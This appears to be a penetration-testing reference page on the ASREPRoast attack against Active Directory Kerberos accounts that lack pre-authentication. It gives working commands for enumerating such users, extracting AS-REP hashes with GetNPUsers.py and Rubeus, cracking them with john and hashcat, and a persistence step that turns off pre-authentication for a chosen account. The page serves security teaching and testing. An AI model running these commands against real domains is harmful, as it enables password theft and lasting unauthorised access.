# ASREPRoast

## ASREPRoast

The ASREPRoast attack looks for **users without Kerberos pre-authentication required attribute \(**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**\)**_.

That means that anyone can send an AS\_REQ request to the DC on behalf of any of those users, and receive an AS\_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

Furthermore, **no domain account is needed to perform this attack**, only connection to the DC. However, **with a domain account**, a LDAP query can be used to **retrieve users without Kerberos pre-authentication** in the domain. **Otherwise usernames have to be guessed**.

#### Enumerating vulnerable users \(need domain credentials\)

```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

#### Request AS\_REP message

{% code title="Using Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Using Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

### Cracking

```text
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```

### Persistence

Force **preauth** not required for a user where you have **GenericAll** permissions \(or permissions to write properties\):

```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

\*\*\*\*[**More information about AS-RRP Roasting in ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)\*\*\*\*

